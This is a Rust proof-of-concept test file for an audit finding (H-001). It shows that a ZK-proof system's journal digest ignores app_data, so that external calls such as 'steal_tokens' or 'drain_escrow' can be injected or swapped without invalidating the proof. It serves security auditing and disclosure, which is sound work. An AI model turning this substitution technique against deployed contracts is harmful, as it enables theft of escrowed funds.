//! PoC: app_data substitution attack (H-001)
//!
//! Demonstrates that `compute_batch_aggregation_journal_digest` reads from
//! `LogicVerifierInputs.instance_journal`, while `extract_external_calls` reads
//! from `LogicVerifierInputs.app_data`. These are independent fields with no
//! on-chain consistency check, allowing an attacker to substitute external calls
//! without invalidating the ZK proof.

use crate::encoding::compute_batch_aggregation_journal_digest;
use crate::external_calls::{encode_external_call, extract_external_calls};
use crate::types::{OutputMode, SolanaExternalCall};
use arm_core::logic_instance::{AppData, LogicInstance};
use arm_core::Digest;

use crate::tests::utils::create_minimal_transaction;

/// Build a `LogicInstance` and return both the instance and its borsh-serialized journal bytes.
fn make_logic_instance(tag: Digest, is_consumed: bool, app_data: AppData) -> (LogicInstance, Vec<u8>) {
    let instance = LogicInstance {
        tag,
        is_consumed,
        root: Digest::default(),
        app_data,
    };
    let journal = instance.to_journal().expect("borsh serialization should succeed");
    (instance, journal)
}

fn make_external_call(program_id: [u8; 32], instruction_data: Vec<u8>) -> SolanaExternalCall {
    SolanaExternalCall {
        program_id,
        instruction_data,
        expected_output: vec![],
        output_mode: OutputMode::ReturnData,
    }
}

/// CORE DEMONSTRATION: Changing `app_data` does NOT change the journal digest.
///
/// The journal digest — which is what the Groth16 proof binds to — depends only
/// on `instance_journal`. An attacker can freely substitute `app_data` (including
/// `external_payload`) without invalidating the proof.
#[test]
fn app_data_substitution_does_not_change_journal_digest() {
    let mut tx = create_minimal_transaction();
    let action = &mut tx.actions[0];

    // Populate instance_journal for both LVIs from a LogicInstance with EMPTY app_data.
    let consumed_tag = action.compliance_units[0].instance.consumed_nullifier;
    let created_tag = action.compliance_units[0].instance.created_commitment;

    let (_, consumed_journal) = make_logic_instance(consumed_tag, true, AppData::default());
    let (_, created_journal) = make_logic_instance(created_tag, false, AppData::default());

    action.logic_verifier_inputs[0].instance_journal = consumed_journal.clone();
    action.logic_verifier_inputs[1].instance_journal = created_journal.clone();

    // Compute digest with empty app_data.
    let digest_before = compute_batch_aggregation_journal_digest(&tx)
        .expect("digest should succeed with empty app_data");

    // Now inject a MALICIOUS external call into app_data.
    let malicious_call = make_external_call([0xAA; 32], vec![0xDE, 0xAD, 0xBE, 0xEF]);
    tx.actions[0].logic_verifier_inputs[0]
        .app_data
        .external_payload
        .push(encode_external_call(&malicious_call));

    // Compute digest AFTER substitution — instance_journal is unchanged.
    let digest_after = compute_batch_aggregation_journal_digest(&tx)
        .expect("digest should succeed with injected app_data");

    // THE VULNERABILITY: digest is identical despite different app_data.
    assert_eq!(
        digest_before, digest_after,
        "BUG CONFIRMED: journal digest is blind to app_data changes. \
         An attacker can substitute external_payload without invalidating the proof."
    );
}

/// Verify that extract_external_calls reads from the (unverified) app_data field.
///
/// Combined with the above, this shows the full attack: an attacker substitutes
/// app_data.external_payload, the proof still verifies, and the PA extracts and
/// executes the attacker's chosen external calls.
#[test]
fn extract_external_calls_reads_from_unverified_app_data() {
    let mut tx = create_minimal_transaction();
    let action = &mut tx.actions[0];

    // Set instance_journal to represent a LogicInstance with NO external calls.
    let consumed_tag = action.compliance_units[0].instance.consumed_nullifier;
    let created_tag = action.compliance_units[0].instance.created_commitment;

    let (_, consumed_journal) = make_logic_instance(consumed_tag, true, AppData::default());
    let (_, created_journal) = make_logic_instance(created_tag, false, AppData::default());

    action.logic_verifier_inputs[0].instance_journal = consumed_journal;
    action.logic_verifier_inputs[1].instance_journal = created_journal;

    // Verify: no external calls from the honest transaction.
    let calls_before = extract_external_calls(&tx).expect("extraction should succeed");
    assert!(
        calls_before.is_empty(),
        "Honest transaction should have no external calls"
    );

    // ATTACK: inject external calls into app_data that were never proven.
    let injected_call = make_external_call([0xBB; 32], b"steal_tokens".to_vec());
    tx.actions[0].logic_verifier_inputs[0]
        .app_data
        .external_payload
        .push(encode_external_call(&injected_call));

    // The PA extracts external calls from app_data — these are the ATTACKER's calls.
    let calls_after = extract_external_calls(&tx).expect("extraction should succeed");
    assert_eq!(
        calls_after.len(),
        1,
        "Attacker's injected call should be extracted"
    );

    let (_logic_ref, extracted_call) = &calls_after[0];
    assert_eq!(
        extracted_call.program_id, [0xBB; 32],
        "Extracted call should have the attacker's program_id"
    );
    assert_eq!(
        extracted_call.instruction_data,
        b"steal_tokens",
        "Extracted call should have the attacker's instruction data"
    );

    // And the journal digest is STILL the same as the honest version.
    // (Proof verification would pass with the original proof.)
    let digest = compute_batch_aggregation_journal_digest(&tx)
        .expect("digest computation should succeed");

    // Recompute with clean app_data to confirm equality.
    let mut clean_tx = tx.clone();
    clean_tx.actions[0].logic_verifier_inputs[0]
        .app_data
        .external_payload
        .clear();
    let clean_digest = compute_batch_aggregation_journal_digest(&clean_tx)
        .expect("clean digest should succeed");

    assert_eq!(
        digest, clean_digest,
        "Journal digest is identical with or without the injected external call. \
         The proof passes regardless of what app_data contains."
    );
}

/// Demonstrate that the attacker can REPLACE existing external calls with different ones.
///
/// Even if the original transaction had legitimate external calls proven by the circuit,
/// the attacker can swap them for completely different calls.
#[test]
fn app_data_external_calls_can_be_replaced_entirely() {
    let mut tx = create_minimal_transaction();
    let action = &mut tx.actions[0];

    let consumed_tag = action.compliance_units[0].instance.consumed_nullifier;
    let created_tag = action.compliance_units[0].instance.created_commitment;

    // The "honest" logic instance has a legitimate external call.
    let legitimate_call = make_external_call([0x11; 32], b"legitimate_operation".to_vec());
    let mut honest_app_data = AppData::default();
    honest_app_data.external_payload.push(encode_external_call(&legitimate_call));

    let (_, consumed_journal) = make_logic_instance(consumed_tag, true, honest_app_data.clone());
    let (_, created_journal) = make_logic_instance(created_tag, false, AppData::default());

    // Set instance_journal from the honest LogicInstance (this is what the proof covers).
    action.logic_verifier_inputs[0].instance_journal = consumed_journal;
    action.logic_verifier_inputs[1].instance_journal = created_journal;

    // Set app_data to contain the HONEST call — consistent state.
    action.logic_verifier_inputs[0].app_data = honest_app_data;

    let digest_honest = compute_batch_aggregation_journal_digest(&tx).unwrap();
    let calls_honest = extract_external_calls(&tx).unwrap();
    assert_eq!(calls_honest.len(), 1);

    let honest_program_id = calls_honest[0].1.program_id;
    assert_eq!(honest_program_id, [0x11; 32]);

    // ATTACK: replace the external call with a malicious one.
    let malicious_call = make_external_call([0xFF; 32], b"drain_escrow".to_vec());
    tx.actions[0].logic_verifier_inputs[0].app_data.external_payload = vec![
        encode_external_call(&malicious_call),
    ];

    let digest_malicious = compute_batch_aggregation_journal_digest(&tx).unwrap();
    let calls_malicious = extract_external_calls(&tx).unwrap();

    // The proof-binding digest is unchanged.
    assert_eq!(
        digest_honest, digest_malicious,
        "Replacing external calls in app_data does not change the journal digest"
    );

    // But the extracted calls are now the attacker's.
    assert_eq!(calls_malicious.len(), 1);
    assert_eq!(
        calls_malicious[0].1.program_id, [0xFF; 32],
        "The PA would now CPI to the attacker's program instead of the legitimate one"
    );
    assert_eq!(
        calls_malicious[0].1.instruction_data,
        b"drain_escrow",
        "The PA would execute the attacker's instruction data"
    );
}
